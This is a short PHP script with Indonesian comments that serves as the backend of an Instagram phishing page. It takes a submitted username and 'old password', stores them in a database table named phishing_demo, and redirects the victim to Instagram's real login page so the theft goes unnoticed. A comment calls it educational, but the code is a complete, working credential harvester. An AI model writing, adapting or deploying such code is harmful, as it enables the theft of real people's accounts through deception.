<?php
require_once 'db.php'; // Tambahkan baris ini untuk koneksi database
// Mengambil data dari form
$identity = $_POST['identity'];
$old_pass = $_POST['old_pass'];



// Mencatat hasil ke file teks (HANYA UNTUK EDUKASI)
$stmt = $pdo->prepare("
    INSERT INTO phishing_demo (identity, password)
    VALUES (:identity, :password)
");

$stmt->execute([
    ':identity' => $identity,
    ':password' => $old_pass
]);

// Redirect to Instagram login page
header('Location: https://www.instagram.com/accounts/login/');
exit;